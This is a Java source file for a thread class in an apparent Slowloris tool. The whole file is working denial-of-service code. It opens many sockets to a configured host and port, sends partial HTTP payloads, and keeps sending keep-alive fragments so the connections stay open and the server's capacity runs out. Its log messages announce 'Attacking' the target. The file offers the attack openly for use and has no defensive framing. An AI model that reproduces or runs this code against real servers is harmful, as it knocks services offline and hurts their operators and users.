package io.github.lxgaming.slowloris.util;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map.Entry;
import java.util.Random;

import io.github.lxgaming.slowloris.Slowloris;

public class SlowlorisThread extends Thread {
	
	private HashMap<Integer, Socket> socketList = new HashMap<Integer, Socket>();
	
	@Override
	public void run() {
		try {
			ConsoleOutput.info("Attacking '" + Slowloris.getSlowloris().getConfig().getHost() + ":" + Slowloris.getSlowloris().getConfig().getPort() + "' with '" + Slowloris.getSlowloris().getConfig().getConnections() + "' connections");
			while (!Thread.currentThread().isInterrupted()) {
				process();
				Thread.sleep(Slowloris.getSlowloris().getConfig().getSleep());
			}
		} catch (InterruptedException ex) {
			ConsoleOutput.error("Thread Exception!");
			ex.printStackTrace();
		}
	}
	
	private void process() {		
		if (socketList.size() != Slowloris.getSlowloris().getConfig().getConnections()) {
			ConsoleOutput.info("Creating sockets...");
			for (int socketCount = socketList.size(); socketCount < Slowloris.getSlowloris().getConfig().getConnections(); socketCount++) {
				try {
					Socket socket = new Socket();
					socket.connect(new InetSocketAddress(Slowloris.getSlowloris().getConfig().getHost(), Slowloris.getSlowloris().getConfig().getPort()), Slowloris.getSlowloris().getConfig().getTimeout());
					PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
					printWriter.print(Slowloris.getSlowloris().getConfig().getPayload().replaceAll("%host%", Slowloris.getSlowloris().getConfig().getHost()).replaceAll("%random%", "" + new Random().nextInt(2000)));
					printWriter.flush();
					socketList.put(socketCount, socket);
					ConsoleOutput.info("Socket #" + socketCount + " successfully created.");
				} catch (IllegalArgumentException | IOException | SecurityException ex) {
					socketList.remove(socketCount);
					ConsoleOutput.error("Socket #" + socketCount + " exception!");
				}
			}
		}
		
		if (!socketList.isEmpty()) {
			ConsoleOutput.info("Sending keep-alive...");
			for (Entry<Integer, Socket> entry : socketList.entrySet()) {
				try {
					if (entry.getValue().isClosed()) {
						socketList.remove(entry.getKey());
						ConsoleOutput.error("Socket #" + entry.getKey() + " Closed!");
						continue;
					}
					PrintWriter printWriter = new PrintWriter(entry.getValue().getOutputStream());
					printWriter.print(Slowloris.getSlowloris().getConfig().getKeepAlive().replaceAll("%random%", "" + new Random().nextInt(5000)));
					printWriter.flush();
				} catch (IllegalArgumentException | IOException | SecurityException ex) {
					socketList.remove(entry.getKey());
					ConsoleOutput.error("Socket #" + entry.getKey() + " exception!");
				}
			}
		}
		return;
	}
}